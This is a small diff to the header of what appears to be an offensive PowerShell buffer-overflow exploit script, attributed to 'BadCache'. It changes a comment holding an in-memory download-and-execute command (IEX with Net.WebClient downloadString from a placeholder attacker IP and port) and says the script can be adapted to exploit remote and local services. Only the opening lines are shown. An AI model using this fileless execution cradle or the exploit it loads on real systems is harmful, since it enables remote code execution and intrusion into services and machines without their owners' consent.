@@ -1,6 +1,6 @@
 # BadCache's In memory PowerShell BoF script
 
-# Run in memory: powershell IEX(New-Object Net.WebClient).downloadString('http://<IP>:<Port>/BoF.ps1')
+# Run in memory: powershell IEX(New-Object Net.WebClient).downloadString('http://<IP>:<Port>/powerBoF.ps1')
 # This script can be updated to BoF exploit remote and local services. 
 
 $tcpClient = New-Object System.Net.Sockets.TCPClient
